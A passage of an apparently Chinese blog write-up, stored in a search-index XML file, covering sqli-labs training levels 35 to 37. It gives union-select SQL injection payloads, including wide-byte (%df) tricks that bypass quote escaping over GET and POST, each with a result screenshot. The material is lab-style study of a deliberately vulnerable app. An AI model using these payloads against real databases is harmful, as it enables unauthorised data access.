<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1�&#39; union select 1,2 -- </span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021021819393675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-35-数值型注入"><a href="#Less-35-数值型注入" class="headerlink" title="Less-35-数值型注入"></a>Less-35-数值型注入</h1><p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999 union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210218194057972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-36-基于’-的宽字节注入"><a href="#Less-36-基于’-的宽字节注入" class="headerlink" title="Less-36-基于’ 的宽字节注入"></a>Less-36-基于’ 的宽字节注入</h1><p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210218194250953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-37-基于POST型的宽字节注入"><a href="#Less-37-基于POST型的宽字节注入" class="headerlink" title="Less-37-基于POST型的宽字节注入"></a>Less-37-基于POST型的宽字节注入</h1><p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999�&#39; union select 1,2 -- </span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210218194420881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>sql-labs</tag>
      </tags>
  </entry>
</search>
